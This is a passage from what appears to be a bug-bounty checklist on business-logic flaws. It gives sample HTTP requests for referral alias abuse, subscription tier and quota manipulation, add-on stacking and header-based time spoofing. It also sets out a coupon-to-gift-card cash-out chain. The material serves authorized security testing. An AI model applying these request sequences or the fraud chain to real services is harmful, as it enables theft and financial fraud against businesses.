attacker.@gmail.com, a.t.t.acker@gmail.com         # Dots ignored on Gmail
attacker@googlemail.com                            # gmail/googlemail equivalence

# Sign up the alias, receive referral
POST /api/refer { "email": "a+1@x.com" }  # Repeat — many sign-ups, all same person
```

---

### Tier Downgrade Retains Premium Features

```http
PUT /api/subscription { "tier": "free" }   # Cancel paid
GET /api/feature/premium-export             # Still works because feature flag cached?
```

### Mid-Cycle Quota Reset

```http
PUT /api/subscription { "tier": "pro" }   # +1000 quota
PUT /api/subscription { "tier": "free" }  # Resets to 0? Or just caps display?
PUT /api/subscription { "tier": "pro" }   # +1000 again — net 2000 in one cycle
```

### Add-On Stacking

```http
POST /api/addons { "id": "extra-storage" }   # +10GB
POST /api/addons { "id": "extra-storage" }   # Stacks to 20GB?
POST /api/addons { "id": "extra-storage" }   # Or charges once, stacks N times?
```

---

### Time Travel via Headers

```http
POST /api/checkout
Date: Wed, 01 Jan 2020 00:00:00 GMT      # Server-trusted time?
X-Request-Time: 1577836800
```

### Promotion Window

Set client-side date to inside the window, server validates `X-Promo-Time` parameter. Stale promo cache means yesterday's prices apply today.

### Token / Session Expiry

Refresh token endpoint that doesn't check the original token's expiry → indefinite session extension.

---

## Combining Flaws — Where the Crits Live

Single-axis findings are interesting; **chains** are payouts.

**Example chain (real, paid bounty):**
1. Coupon stacking allows `100% off` × 2 → negative total
2. Negative total → store credit issued (refund of "overpayment")
3. Store credit transferable to gift card
4. Gift card race condition → multiplied
5. Gift card redeemable on partner site for cash equivalents

**Chain template:**
- Find a thing the system gives you (credit, points, slot, seat)
- Find a way to multiply it (race, replay, stacking)
- Find a way to convert it to value (transfer, refund, payout)

---

## Engagement Approach

```
Day 1:  Map state machines for top 3 money flows.
Day 2:  Per state, list what the UI does. Check what the API allows.
Day 3:  Single-axis tests (price tampering, role mass-assignment, replay, currency).
Day 4:  Race conditions on every "one-shot" action.
Day 5:  Chain the findings. Quantify financial impact per chain.
```

Document each finding as: pre-conditions → exact request sequence → state delta → financial impact per execution → scaling factor.

---

## Reporting Hooks

Business-logic findings often get downgraded by triagers who don't understand the chain. Always include:

- A diagram of the intended flow vs. the achieved flow
- A scripted PoC that runs end-to-end (no manual steps)
- A dollar value per execution and a feasibility statement for repeating it
- The fix at the right layer (state machine validator, not just input validation)

---

## Key References

- OWASP WSTG-BUSL — Business Logic Testing chapter
- PortSwigger Web Security Academy: Business logic vulnerabilities track
- MITRE ATT&CK: T1539 (Steal Web Session Cookie), T1078 (Valid Accounts) — for chained access
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/business-logic.md
